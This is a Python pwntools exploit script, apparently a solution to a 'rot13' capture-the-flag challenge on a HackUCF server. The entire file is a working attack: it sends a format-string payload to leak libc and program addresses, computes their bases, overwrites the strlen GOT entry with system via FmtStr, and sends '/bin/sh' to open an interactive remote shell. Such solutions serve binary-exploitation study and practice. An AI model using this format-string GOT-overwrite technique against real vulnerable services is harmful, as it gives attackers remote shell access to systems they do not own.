from pwn import *
import codecs

exe = ELF('rot13')
libc = ELF('rot13-libc.so')
io = remote('ctf.hackucf.org', 20006)

def rot13(arg):
    rotated = bytearray(arg)
    for i in range(len(rotated)):
        byte = rotated[i]
        if 65 <= byte <= 90:  # Uppercase A-Z
            rotated[i] = (byte - 65 + 13) % 26 + 65
        elif 97 <= byte <= 122:  # Lowercase a-z
            rotated[i] = (byte - 97 + 13) % 26 + 97
    return bytes(rotated)

def send_payload(payload):
    try:
        io.recvuntil(b'Enter some text to be rot13 encrypted:\n')
        rot13_payload = rot13(payload)
        print("Sending ROT13 Payload:", rot13_payload)
        io.sendline(rot13_payload)
        return io.recvline().replace(b'Rot13 encrypted data: ', b'').strip()
    except Exception as e:
        print("Error:", e)
        return None

# Sending the payload and splitting the response
leak = send_payload(b"%2$p&%3$p")

leak_parts = leak.split(b'&')
log.info("Leak parts: %s", leak_parts)
# so when we add the addresses of libc and exe, the symbols and got dicts get 
# updated to reflect the addresses of these functions with respect to the 
# offset which is generated at runtime
libc.address = int(leak_parts[0], 16) - (libc.symbols['__ctype_b_loc']+5) #__ctype_b_loc + 5
exe.address = int(leak_parts[1], 16) - (exe.symbols['main']+362) #main + 6
log.info("libc.address: %s", hex(libc.address))
log.info("exe.address: %s", hex(exe.address))
fmt = FmtStr(offset=7, execute_fmt=send_payload)
fmt.write(exe.got['strlen'], libc.symbols['system'])
fmt.execute_writes()
io.sendline(b"/bin/sh")
io.interactive()

